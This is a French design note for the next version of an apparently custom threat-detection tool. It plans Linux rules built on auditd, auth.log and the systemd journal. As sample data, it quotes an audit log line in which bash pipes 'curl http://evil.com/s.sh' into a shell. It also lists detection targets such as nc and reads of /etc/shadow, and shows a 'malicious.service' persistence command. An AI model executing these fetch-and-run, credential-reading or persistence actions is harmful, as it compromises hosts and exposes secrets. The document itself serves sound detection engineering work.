# v5 — Détection Linux étendue

## Objectif

Étendre la couverture Linux au-delà des patterns CommandLine en intégrant des sources de logs natives Linux.

## Sources à intégrer

### auditd (`/var/log/audit/audit.log`)

Auditd est le sous-système d'audit du kernel Linux. Il loggue les syscalls au niveau le plus bas — impossible à contourner depuis l'espace utilisateur.

```
type=EXECVE msg=audit(1705320000.123:456): argc=3 a0="bash" a1="-c" a2="curl http://evil.com/s.sh | bash"
type=SYSCALL msg=audit(1705320000.456:789): syscall=59 success=yes exe="/bin/bash" uid=1000
```

Règles auditd à implémenter :
- `execve` avec arguments suspects (curl, wget, nc)
- `open` sur `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`
- `connect` depuis des processus non-réseau habituels
- `chmod` / `chown` sur des binaires système

### PAM logs (`/var/log/auth.log`)

Authentification suspecte :
- Brute force SSH (`Failed password for root from x.x.x.x`)
- Escalade `sudo` inhabituelle
- Connexion root directe

### systemd journal

Services créés dynamiquement :
```bash
systemctl enable --now malicious.service
```

## Nouveaux fichiers prévus

```
src/detect/modules/
├── linux_auditd.yaml      # Règles syscall auditd
├── linux_auth.yaml        # PAM / SSH brute force
└── linux_systemd.yaml     # Service creation / manipulation
```

## Recommandation

Avant v5, implémenter la **déduplication des Signals** (v5.5 dans la roadmap) pour éviter que plusieurs règles Linux matchant le même événement produisent des Signals redondants.
